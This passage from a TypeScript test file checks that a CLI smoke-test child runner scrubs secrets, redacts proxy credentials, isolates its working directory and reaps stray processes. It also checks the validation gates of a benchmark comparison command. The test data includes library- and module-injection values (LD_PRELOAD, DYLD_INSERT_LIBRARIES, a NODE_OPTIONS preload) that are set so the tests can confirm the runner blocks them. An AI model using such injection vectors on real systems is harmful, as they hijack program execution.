    expect(result.timedOut).toBeUndefined()
  })

  it('passes integer deadlines and applies the launch allowlist to explicit overrides', async () => {
    const script = tempFile('explicit-env-probe.mjs', [
      'process.stdout.write(JSON.stringify(process.env))',
      '',
    ].join('\n'))
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [script], {
        env: {
          AUDIT_KEY_ID: 'hidden-key',
          audit_password_hint: 'hidden-password',
          DEPLOY_SECRET_NAME: 'hidden-secret',
          ACCESS_TOKEN_FILE: 'hidden-token',
          SERVICE_AUTH_MODE: 'hidden-auth',
          client_credential_path: 'hidden-credential',
          SESSION_COOKIE_NAME: 'hidden-cookie',
          CURATED_SAFE: 'visible',
          CURATED_UNSET: undefined,
          PATH: '/safe/bin',
          HOME: '/safe/home-directory',
          USERPROFILE: 'C:\\safe\\profile',
          TMP: '/safe/tmp',
          TEMP: '/safe/temp',
          TMPDIR: '/safe/tmpdir',
          SYSTEMROOT: 'C:\\Windows',
          WINDIR: 'C:\\Windows',
          COMSPEC: 'C:\\Windows\\System32\\cmd.exe',
          PATHEXT: '.COM;.EXE',
          LANG: 'en_US.UTF-8',
          LC_ALL: 'C.UTF-8',
          DSH_HOME: '/safe/home',
          DSH_TELEMETRY_DISABLED: '1',
          DSH_PRIVATE_VALUE: 'hidden',
        },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000.5,
      })

      expect(result.status).toBe(0)
      const env = JSON.parse(result.stdout) as Record<string, string>
      expect(env).not.toHaveProperty('AUDIT_KEY_ID')
      expect(env).not.toHaveProperty('audit_password_hint')
      expect(env).not.toHaveProperty('DEPLOY_SECRET_NAME')
      expect(env).not.toHaveProperty('ACCESS_TOKEN_FILE')
      expect(env).not.toHaveProperty('SERVICE_AUTH_MODE')
      expect(env).not.toHaveProperty('client_credential_path')
      expect(env).not.toHaveProperty('SESSION_COOKIE_NAME')
      expect(env).not.toHaveProperty('CURATED_SAFE')
      expect(env).toMatchObject({
        PATH: '/safe/bin',
        HOME: '/safe/home-directory',
        USERPROFILE: 'C:\\safe\\profile',
        TMP: '/safe/tmp',
        TEMP: '/safe/temp',
        TMPDIR: '/safe/tmpdir',
        SYSTEMROOT: 'C:\\Windows',
        WINDIR: 'C:\\Windows',
        COMSPEC: 'C:\\Windows\\System32\\cmd.exe',
        PATHEXT: '.COM;.EXE',
        LANG: 'en_US.UTF-8',
        LC_ALL: 'C.UTF-8',
        DSH_HOME: '/safe/home',
        DSH_TELEMETRY_DISABLED: '1',
      })
    } finally {
      cleanup(script)
    }
  })

  it('fails closed on malformed proxy values and redacts every userinfo form from child output', async () => {
    const secret = 'proxy-password'
    const schemeSecret = 'scheme-proxy-password'
    const malformedSecret = 'malformed-proxy-password'
    const diagnosticUrl = [
      `https://diagnostic:${schemeSecret}@example.invalid/path`,
      `diagnostic:${secret}@example.invalid:8443`,
      `http//diagnostic:${malformedSecret}@example.invalid`,
      `http://orphan:${malformedSecret}@`,
    ].join('\n')
    const script = tempFile('proxy-env-probe.mjs', [
      'process.stdout.write(JSON.stringify(process.env))',
      `process.stderr.write(${JSON.stringify(diagnosticUrl)})`,
      '',
    ].join('\n'))
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [script], {
        env: {
          HTTP_PROXY: `http://alice:${secret}@`,
          https_proxy: `http//bob:${malformedSecret}@proxy.example`,
          ALL_PROXY: `socks5://carol:${secret}@proxy.example`,
          no_proxy: `http://dave:${secret}@proxy.example`,
          NO_PROXY: 'proxy.example',
          npm_config_proxy: 'http://proxy.example:8080',
          npm_config_http_proxy: `1http://erin:${malformedSecret}@proxy.example`,
          npm_config_https_proxy: `heidi:${secret}@proxy.example:8443`,
          NPM_CONFIG_HTTPS_PROXY: `https://frank:${secret}@proxy.example`,
          NpM_CoNfIg_HtTp_PrOxY: `http://grace:${secret}@proxy.example`,
          NPM_CONFIG_NO_PROXY: `user:${secret}@proxy.example`,
        },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result.status).toBe(0)
      const env = JSON.parse(result.stdout) as Record<string, string>
      expect(env).not.toHaveProperty('HTTP_PROXY')
      expect(env).not.toHaveProperty('https_proxy')
      expect(env).not.toHaveProperty('ALL_PROXY')
      expect(env).not.toHaveProperty('no_proxy')
      expect(env.npm_config_proxy).toBe('http://proxy.example:8080')
      expect(env).not.toHaveProperty('npm_config_http_proxy')
      expect(env).not.toHaveProperty('npm_config_https_proxy')
      expect(env).not.toHaveProperty('NPM_CONFIG_HTTPS_PROXY')
      expect(env).not.toHaveProperty('NpM_CoNfIg_HtTp_PrOxY')
      expect(env).not.toHaveProperty('NPM_CONFIG_NO_PROXY')
      expect(env.NO_PROXY).toBe('proxy.example')
      expect(result.stdout).not.toContain(secret)
      expect(result.stderr).not.toContain(secret)
      expect(result.stderr).not.toContain(schemeSecret)
      expect(result.stderr).not.toContain(malformedSecret)
      expect(result.stderr).toContain('[REDACTED]')
    } finally {
      cleanup(script)
    }
  })

  it('retains a non-URL no_proxy list', async () => {
    const runner = createSmokeProfileChildRunner(process.execPath, [
      '-e',
      'process.stdout.write(process.env.no_proxy ?? "absent")',
      '--',
    ], {
      env: { no_proxy: 'localhost,127.0.0.1' },
    })
    const result = await runner({
      stage: 'help',
      profile: 'web-curated',
      bundles: ['@deepseek-ai/dsh-base'],
      timeoutMs: 5000,
    })

    expect(result).toMatchObject({ status: 0, stdout: 'localhost,127.0.0.1' })
  })

  it('passes only credential-free HTTP(S) proxy origins and NO_PROXY lists', async () => {
    const querySecret = 'query-proxy-secret'
    const fragmentSecret = 'fragment-proxy-secret'
    const runner = createSmokeProfileChildRunner(process.execPath, [
      '-e',
      'process.stdout.write(JSON.stringify(process.env))',
      '--',
    ], {
      env: {
        HTTP_PROXY: 'http://proxy.example:8080',
        HTTPS_PROXY: `https://proxy.example/?access_token=${querySecret}`,
        https_proxy: `https://proxy.example/#${fragmentSecret}`,
        Https_Proxy: 'https://proxy.example/forward',
        ALL_PROXY: 'socks5://proxy.example',
        NO_PROXY: 'localhost,.example.com,127.0.0.1:8080',
        no_proxy: 'http://proxy.example',
        npm_config_proxy: 'https://npm-proxy.example:8443',
      },
    })
    const result = await runner({
      stage: 'help',
      profile: 'web-curated',
      bundles: ['@deepseek-ai/dsh-base'],
      timeoutMs: 5000,
    })
    const env = JSON.parse(result.stdout) as Record<string, string>

    expect(result.status).toBe(0)
    expect(env).toMatchObject({
      HTTP_PROXY: 'http://proxy.example:8080',
      NO_PROXY: 'localhost,.example.com,127.0.0.1:8080',
      npm_config_proxy: 'https://npm-proxy.example:8443',
    })
    expect(env).not.toHaveProperty('HTTPS_PROXY')
    expect(env).not.toHaveProperty('https_proxy')
    expect(env).not.toHaveProperty('Https_Proxy')
    expect(env).not.toHaveProperty('ALL_PROXY')
    expect(env).not.toHaveProperty('no_proxy')
    expect(result.stdout).not.toContain(querySecret)
    expect(result.stdout).not.toContain(fragmentSecret)
  })

  it('drops a malformed non-URL no_proxy list', async () => {
    for (const [value, expected] of [
      ['*', '*'],
      ['*.example.com', '*.example.com'],
      ['.example.com', '.example.com'],
      ['', 'absent'],
      ['bad/path', 'absent'],
      ['localhost:not-a-port', 'absent'],
    ] as const) {
      const runner = createSmokeProfileChildRunner(process.execPath, [
        '-e',
        'process.stdout.write(process.env.no_proxy ?? "absent")',
        '--',
      ], {
        env: { no_proxy: value },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result).toMatchObject({ status: 0, stdout: expected })
    }
  })

  it.skipIf(process.platform === 'win32')('times out and reaps a TERM-trapping process tree', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-process-tree-'))
    const pidFile = join(root, 'descendant.pid')
    const script = join(root, 'parent.mjs')
    let descendantPid: number | undefined
    writeFileSync(script, [
      'import { spawn } from "node:child_process"',
      'import { writeFileSync } from "node:fs"',
      'process.on("SIGTERM", () => {})',
      'const descendant = spawn(process.execPath, [',
      '  "-e",',
      '  "process.on(\'SIGTERM\', () => {}); setInterval(() => {}, 1000)",',
      '], { stdio: "ignore" })',
      'writeFileSync(process.argv[2], String(descendant.pid))',
      'setTimeout(() => process.exit(0), 1500)',
      '',
    ].join('\n'))
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [script, pidFile])
      const startedAt = Date.now()
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 300,
      })
      descendantPid = Number(readFileSync(pidFile, 'utf8'))

      expect(result).toMatchObject({ status: 124, timedOut: true })
      expect(Date.now() - startedAt).toBeLessThan(1000)
      expect(() => process.kill(descendantPid as number, 0)).toThrow()
    } finally {
      if (descendantPid !== undefined) {
        try {
          process.kill(descendantPid, 'SIGKILL')
        } catch {
          // The runner already reaped the descendant.
        }
      }
      rmSync(root, { recursive: true, force: true })
    }
  })

  it.skipIf(process.platform === 'win32')(
    'fails after reaping descendants left by a successful top-level child',
    async () => {
      const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-residual-tree-'))
      const pidFile = join(root, 'descendant.pid')
      const script = join(root, 'parent.mjs')
      const secret = 'residual-process-secret'
      let descendantPid: number | undefined
      writeFileSync(script, [
        'import { spawn } from "node:child_process"',
        'import { writeFileSync } from "node:fs"',
        'const descendant = spawn(process.execPath, [',
        '  "-e",',
        '  "process.on(\'SIGTERM\', () => {}); setInterval(() => {}, 1000)",',
        '], { stdio: "ignore" })',
        'writeFileSync(process.argv[2], String(descendant.pid))',
        `process.stderr.write("token=${secret}\\n")`,
        'setTimeout(() => process.exit(0), 50)',
        '',
      ].join('\n'))
      try {
        const runner = createSmokeProfileChildRunner(process.execPath, [script, pidFile])
        const startedAt = Date.now()
        const result = await runner({
          stage: 'help',
          profile: 'web-curated',
          bundles: ['@deepseek-ai/dsh-base'],
          timeoutMs: 5000,
        })
        descendantPid = Number(readFileSync(pidFile, 'utf8'))

        expect(result).toMatchObject({
          status: 1,
          stderr: 'smoke-profile child exited while its process group still had running descendants',
        })
        expect(result.timedOut).toBeUndefined()
        expect(result.stderr).not.toContain(secret)
        expect(Buffer.byteLength(result.stderr)).toBeLessThan(256)
        expect(Date.now() - startedAt).toBeLessThan(1000)
        expect(() => process.kill(descendantPid as number, 0)).toThrow()
      } finally {
        if (descendantPid !== undefined) {
          try {
            process.kill(descendantPid, 'SIGKILL')
          } catch {
            // The runner already reaped the descendant.
          }
        }
        rmSync(root, { recursive: true, force: true })
      }
    },
  )

  it.skipIf(process.platform === 'win32')(
    'bounds continuous child output and reaps its process tree',
    async () => {
      const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-output-limit-'))
      const descendantPidFile = join(root, 'descendant.pid')
      const cwdFile = join(root, 'child.cwd')
      const script = join(root, 'output.mjs')
      let descendantPid: number | undefined
      writeFileSync(script, [
        'import { spawn } from "node:child_process"',
        'import { writeFileSync } from "node:fs"',
        'process.on("SIGTERM", () => {})',
        'const descendant = spawn(process.execPath, [',
        '  "-e",',
        '  "process.on(\'SIGTERM\', () => {}); setInterval(() => {}, 1000)",',
        '], { stdio: "ignore" })',
        'writeFileSync(process.argv[2], String(descendant.pid))',
        'writeFileSync(process.argv[3], process.cwd())',
        'const chunk = "x".repeat(70 * 1024)',
        'let writes = 0',
        'const emit = () => {',
        '  process.stdout.write(chunk)',
        '  writes += 1',
        '  if (writes < 64) setImmediate(emit)',
        '}',
        'emit()',
        'setInterval(() => {}, 1000)',
        '',
      ].join('\n'))
      try {
        const runner = createSmokeProfileChildRunner(
          process.execPath,
          [script, descendantPidFile, cwdFile],
        )
        const result = await runner({
          stage: 'help',
          profile: 'web-curated',
          bundles: ['@deepseek-ai/dsh-base'],
          timeoutMs: 1_000,
        })
        descendantPid = Number(readFileSync(descendantPidFile, 'utf8'))
        const childCwd = readFileSync(cwdFile, 'utf8')

        expect(result).toMatchObject({ status: 1 })
        expect(result.timedOut).toBeUndefined()
        expect(result.stderr).toContain('output exceeded')
        expect(Buffer.byteLength(result.stdout) + Buffer.byteLength(result.stderr)).toBeLessThan(1_024)
        expect(() => process.kill(descendantPid as number, 0)).toThrow()
        expect(existsSync(childCwd)).toBe(false)
      } finally {
        if (descendantPid !== undefined) {
          try {
            process.kill(descendantPid, 'SIGKILL')
          } catch {
            // The runner already reaped the descendant.
          }
        }
        rmSync(root, { recursive: true, force: true })
      }
    },
  )

  it.skipIf(process.platform === 'win32')(
    'falls back to child exit state when process-group liveness is not observable',
    async () => {
      const nativeKill = process.kill.bind(process)
      const kill = vi.spyOn(process, 'kill').mockImplementation((pid, signal) => {
        if (signal === 0) {
          const error = new Error('operation not permitted') as NodeJS.ErrnoException
          error.code = 'EPERM'
          throw error
        }
        return nativeKill(pid, signal)
      })
      try {
        const runner = createSmokeProfileChildRunner(process.execPath, [
          '-e',
          'setInterval(() => {}, 1000)',
          '--',
        ])
        const result = await runner({
          stage: 'help',
          profile: 'web-curated',
          bundles: ['@deepseek-ai/dsh-base'],
          timeoutMs: 10,
        })

        expect(result).toMatchObject({ status: 124, timedOut: true })
      } finally {
        kill.mockRestore()
      }
    },
  )

  it('removes every ambient credential-shaped name while retaining launch variables', async () => {
    const previous = { ...process.env }
    const script = tempFile('env-probe.mjs', [
      'process.stdout.write(JSON.stringify(process.env))',
      '',
    ].join('\n'))
    process.env.AUDIT_KEY_ID = 'hidden-key'
    process.env.audit_password_hint = 'hidden-password'
    process.env.DEPLOY_SECRET_NAME = 'hidden-secret'
    process.env.ACCESS_TOKEN_FILE = 'hidden-token'
    process.env.SERVICE_AUTH_MODE = 'hidden-auth'
    process.env.client_credential_path = 'hidden-credential'
    process.env.SESSION_COOKIE_NAME = 'hidden-cookie'
    process.env.DSH_PRIVATE_VALUE = 'private-dsh-value'
    process.env.NODE_PATH = '/tmp/hostile-node-path'
    process.env.NODE_REPL_EXTERNAL_MODULE = '/tmp/hostile-repl-module'
    delete process.env.NODE_V8_COVERAGE
    process.env.LD_PRELOAD = '/tmp/hostile-preload'
    process.env.DYLD_INSERT_LIBRARIES = '/tmp/hostile-dyld'
    process.env.PYTHONPATH = '/tmp/hostile-python'
    process.env.RUBYOPT = '-r/tmp/hostile-ruby'
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [script], {
        env: { NODE_V8_COVERAGE: '/tmp/hostile-v8-coverage' },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      const env = JSON.parse(result.stdout) as Record<string, string>
      expect(env).not.toHaveProperty('AUDIT_KEY_ID')
      expect(env).not.toHaveProperty('audit_password_hint')
      expect(env).not.toHaveProperty('DEPLOY_SECRET_NAME')
      expect(env).not.toHaveProperty('ACCESS_TOKEN_FILE')
      expect(env).not.toHaveProperty('SERVICE_AUTH_MODE')
      expect(env).not.toHaveProperty('client_credential_path')
      expect(env).not.toHaveProperty('SESSION_COOKIE_NAME')
      expect(env).not.toHaveProperty('DSH_PRIVATE_VALUE')
      expect(env).not.toHaveProperty('NODE_PATH')
      expect(env).not.toHaveProperty('NODE_REPL_EXTERNAL_MODULE')
      expect(env).not.toHaveProperty('NODE_V8_COVERAGE')
      expect(env).not.toHaveProperty('LD_PRELOAD')
      expect(env).not.toHaveProperty('DYLD_INSERT_LIBRARIES')
      expect(env).not.toHaveProperty('PYTHONPATH')
      expect(env).not.toHaveProperty('RUBYOPT')
      expect(env.PATH).toBe(process.env.PATH)
      expect(env.HOME).toBe(process.env.HOME)
      for (const name of ['LANG', 'LC_ALL', 'HTTP_PROXY', 'HTTPS_PROXY', 'NO_PROXY']) {
        if (process.env[name] !== undefined) expect(env[name]).toBe(process.env[name])
      }
    } finally {
      for (const key of Object.keys(process.env)) {
        if (!(key in previous)) Reflect.deleteProperty(process.env, key)
      }
      for (const [key, value] of Object.entries(previous)) process.env[key] = value
      cleanup(script)
    }
  })


  it('scrubs ambient credentials from smoke child processes', async () => {
    process.env.CURATED_SMOKE_API_KEY = 'sk-smoke-child-secret'
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [
        '-e',
        'console.log(process.env.CURATED_SMOKE_API_KEY ?? "absent")',
        '--',
      ])
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result.status).toBe(0)
      expect(result.stdout.trim()).toBe('absent')
    } finally {
      delete process.env.CURATED_SMOKE_API_KEY
    }
  })

  it.skipIf(process.platform === 'win32')('does not execute an inherited NODE_OPTIONS preload', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-node-options-'))
    const marker = join(root, 'preload-marker')
    const preload = join(root, 'preload.cjs')
    writeFileSync(preload, `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'executed')\n`)
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [
        '-e',
        'process.stdout.write(process.env.NODE_OPTIONS ?? "absent")',
        '--',
      ], {
        env: { NODE_OPTIONS: `--require=${preload}` },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result).toMatchObject({ status: 0, stdout: 'absent' })
      expect(existsSync(marker)).toBe(false)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('fails closed before spawn when the injected platform is win32', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-win32-'))
    const marker = join(root, 'spawn-marker')
    const spawnChild = vi.fn()
    try {
      const runner = createSmokeProfileChildRunner(process.execPath, [
        '-e',
        `require('node:fs').writeFileSync(${JSON.stringify(marker)}, 'spawned')`,
        '--',
      ], {
        platform: 'win32',
        spawn: spawnChild as unknown as typeof import('node:child_process').spawn,
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })

      expect(result).toMatchObject({
        status: 1,
        stdout: '',
        stderr: 'observed smoke is unsupported on Windows until a Job Object child runner is available',
      })
      expect(spawnChild).not.toHaveBeenCalled()
      expect(existsSync(marker)).toBe(false)
    } finally {
      rmSync(root, { recursive: true, force: true })
    }
  })

  it('isolates the child cwd and prevents project or profile dotenv reloads', async () => {
    const root = mkdtempSync(join(tmpdir(), 'dsh-curated-smoke-dotenv-'))
    const repositoryCwd = join(root, 'repository')
    const home = join(root, 'home')
    const script = join(root, 'dotenv-probe.mjs')
    const previousCwd = process.cwd()
    mkdirSync(repositoryCwd)
    mkdirSync(home)
    writeFileSync(join(repositoryCwd, '.env'), 'CURATED_REPOSITORY_MARKER=repository-marker\n')
    writeFileSync(join(home, '.env'), 'CURATED_PROFILE_MARKER=profile-marker\n')
    const tsxLoader = import.meta.resolve('tsx/esm')
    writeFileSync(script, [
      'import { statSync } from "node:fs"',
      `import { loadLayeredEnv } from ${JSON.stringify(pathToFileURL(fileURLToPath(new URL('../../../boot/app-boot/src/index.ts', import.meta.url))).href)}`,
      'loadLayeredEnv("dsh-smoke-probe")',
      'process.stdout.write(JSON.stringify({',
      '  cwd: process.cwd(),',
      '  mode: statSync(process.cwd()).mode & 0o777,',
      '  repository: process.env.CURATED_REPOSITORY_MARKER,',
      '  profile: process.env.CURATED_PROFILE_MARKER,',
      '}))',
      '',
    ].join('\n'))
    try {
      process.chdir(repositoryCwd)
      const runner = createSmokeProfileChildRunner(process.execPath, ['--import', tsxLoader, script], {
        env: { DSH_HOME: home },
      })
      const result = await runner({
        stage: 'help',
        profile: 'web-curated',
        bundles: ['@deepseek-ai/dsh-base'],
        timeoutMs: 5000,
      })
      const payload = JSON.parse(result.stdout) as {
        cwd: string
        mode: number
        repository?: string
        profile?: string
      }

      expect(result.status).toBe(0)
      expect(payload.cwd).not.toBe(repositoryCwd)
      expect(payload.mode).toBe(0o700)
      expect(existsSync(payload.cwd)).toBe(false)
      expect(payload.repository).toBeUndefined()
      expect(payload.profile).toBeUndefined()
    } finally {
      process.chdir(previousCwd)
      rmSync(root, { recursive: true, force: true })
    }
  })
})

describe('compare-benchmark command', () => {
  it('runs the selected command through the shared published-bin runner', async () => {
    const stdout = vi.spyOn(process.stdout, 'write').mockImplementation(() => true)
    const stderr = vi.spyOn(process.stderr, 'write').mockImplementation(() => true)
    const originalArgv = process.argv
    const originalExitCode = process.exitCode
    process.argv = ['node', 'dsh-curated-compare-benchmark', '--json']
    try {
      await runCuratedCommand('compare-benchmark')

      expect(stdout).toHaveBeenCalledWith(expect.stringContaining('"command":"compare-benchmark"'))
      expect(stderr).toHaveBeenCalledWith('')
      expect(process.exitCode).toBe(1)
    } finally {
      process.argv = originalArgv
      process.exitCode = originalExitCode
      stdout.mockRestore()
      stderr.mockRestore()
    }
  })

  it('requires evidence and execution provenance', () => {
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    delete fixture.evidenceKind
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        ok: false,
        issues: [{ message: 'evidenceKind must be observed, fixture, or planned' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('never accepts fixture evidence', () => {
    const fixture = JSON.parse(benchmarkFixture()) as Record<string, unknown>
    fixture.evidenceKind = 'fixture'
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        command: 'compare-benchmark',
        evidenceKind: 'fixture',
        ok: false,
        status: 'unverified',
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects baseline and candidate environment mismatches', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      evidenceKind?: string
      baseline: Record<string, unknown>
      candidate: Record<string, unknown>
    }
    fixture.evidenceKind = 'observed'
    fixture.baseline.execution = {
      id: 'baseline-execution',
      startedAt: '2026-08-25T00:00:00.000Z',
      environment: { model: 'deepseek-chat', prompt: 'prompt-v1', workspace: 'fixture-a', network: 'online', seed: 7 },
      build: benchmarkBuild,
      measurement: benchmarkMeasurement,
    }
    fixture.candidate.execution = {
      id: 'candidate-execution',
      startedAt: '2026-08-25T00:05:00.000Z',
      environment: { model: 'deepseek-chat', prompt: 'prompt-v1', workspace: 'fixture-b', network: 'online', seed: 7 },
      build: benchmarkBuild,
      measurement: benchmarkMeasurement,
    }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate environments must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects task-set and repetition mismatches', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      evidenceKind?: string
      baseline: Record<string, unknown>
      candidate: Record<string, unknown> & { runs: Array<Record<string, unknown>> }
    }
    fixture.evidenceKind = 'observed'
    const environment = { model: 'deepseek-chat', prompt: 'prompt-v1', workspace: 'fixture', network: 'online', seed: 7 }
    fixture.baseline.execution = {
      id: 'baseline-execution',
      startedAt: '2026-08-25T00:00:00.000Z',
      environment,
      build: benchmarkBuild,
      measurement: benchmarkMeasurement,
    }
    fixture.candidate.execution = {
      id: 'candidate-execution',
      startedAt: '2026-08-25T00:05:00.000Z',
      environment,
      build: benchmarkBuild,
      measurement: benchmarkMeasurement,
    }
    fixture.candidate.runs.push(benchmarkRun({ taskId: 'extra', attempt: 1 }))
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate comparison keys must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects critical flag changes for matching task attempts', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      requiredCriticalTaskIds: string[]
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.requiredCriticalTaskIds = ['a', 'b']
    for (const run of fixture.candidate.runs) {
      if (run.taskId === 'c') run.critical = false
    }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate critical flags must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects mismatched repetition attempts for the same task set', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.candidate.runs[0] = { ...fixture.candidate.runs[0], attempt: 6 }
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'baseline and candidate comparison keys must match exactly' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects fewer than five repetitions for any compared task', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs = fixture.baseline.runs.filter(run => run.taskId !== 'a' || run.attempt !== 5)
    fixture.candidate.runs = fixture.candidate.runs.filter(run => run.taskId !== 'a' || run.attempt !== 5)
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'benchmark task a must have at least 5 repetitions per profile' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects a required critical task omitted from both profiles', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    fixture.baseline.runs = fixture.baseline.runs.filter(run => run.taskId !== 'a')
    fixture.candidate.runs = fixture.candidate.runs.filter(run => run.taskId !== 'a')
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'required critical task a is missing from the comparison' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('rejects missing profile execution provenance', () => {
    const fixture = JSON.parse(benchmarkFixture()) as {
      candidate: { execution?: unknown }
    }
    delete fixture.candidate.execution
    const path = tempFile('benchmark.json', JSON.stringify(fixture))
    try {
      const result = runCompareBenchmark(['--fixture', path, '--json'])

      expect(result.status).toBe(1)
      expect(JSON.parse(result.stdout)).toMatchObject({
        issues: [{ message: 'candidate.execution must be an object' }],
      })
    } finally {
      cleanup(path)
    }
  })

  it('evaluates every gate immediately below, at, and above its raw threshold', () => {
    type MutableFixture = {
      requiredCriticalTaskIds: string[]
      baseline: { runs: Array<Record<string, unknown>> }
      candidate: { runs: Array<Record<string, unknown>> }
    }
    type Metric = 'security' | 'dataLoss' | 'rollback' | 'startup' | 'criticalDrop'
      | 'firstTokenIncrease' | 'tokenIncrease' | 'costIncrease' | 'costSuccessGain'
    const cases: readonly {
      readonly name: string
      readonly metric: Metric
      readonly value: number | boolean
      readonly expectedCode?: string
      readonly expectedStatus?: BenchmarkComparison['status']
      readonly expectedIssue?: string
      readonly roundedGroup?: 'security' | 'firstToken' | 'tokens' | 'cost'
    }[] = [
      { name: 'security below 95%', metric: 'security', value: 94.9999, expectedCode: 'security-correctness-below-95', expectedStatus: 'rejected', roundedGroup: 'security' },
      { name: 'security at 95%', metric: 'security', value: 95, roundedGroup: 'security' },
      { name: 'security above 95%', metric: 'security', value: 95.0001, roundedGroup: 'security' },
      { name: 'data loss below zero', metric: 'dataLoss', value: -1, expectedIssue: 'candidate.runs[0].dataLossEvents must be a non-negative safe integer' },
      { name: 'data loss at zero', metric: 'dataLoss', value: 0 },
      { name: 'data loss above zero', metric: 'dataLoss', value: 1, expectedCode: 'data-loss-detected', expectedStatus: 'rejected' },
      { name: 'rollback unavailable', metric: 'rollback', value: false, expectedCode: 'rollback-impossible', expectedStatus: 'rejected' },
      { name: 'rollback available', metric: 'rollback', value: true },
      { name: 'startup failures below 1%', metric: 'startup', value: 0 },
      { name: 'startup failures at 1%', metric: 'startup', value: 1 },
      { name: 'startup failures above 1%', metric: 'startup', value: 2, expectedCode: 'startup-failure-rate-above-1', expectedStatus: 'rejected' },
      { name: 'critical success decline below 3 points', metric: 'criticalDrop', value: 2 },
      { name: 'critical success decline at 3 points', metric: 'criticalDrop', value: 3 },
      { name: 'critical success decline above 3 points', metric: 'criticalDrop', value: 4, expectedCode: 'critical-success-rate-drop', expectedStatus: 'rejected' },
      { name: 'first-token P95 increase below 15%', metric: 'firstTokenIncrease', value: 14.9999, roundedGroup: 'firstToken' },
      { name: 'first-token P95 increase at 15%', metric: 'firstTokenIncrease', value: 15, roundedGroup: 'firstToken' },
      { name: 'first-token P95 increase above 15%', metric: 'firstTokenIncrease', value: 15.0001, expectedCode: 'first-token-p95-regression', expectedStatus: 'rollback', roundedGroup: 'firstToken' },
      { name: 'prompt/schema token increase below 20%', metric: 'tokenIncrease', value: 19.9999, roundedGroup: 'tokens' },
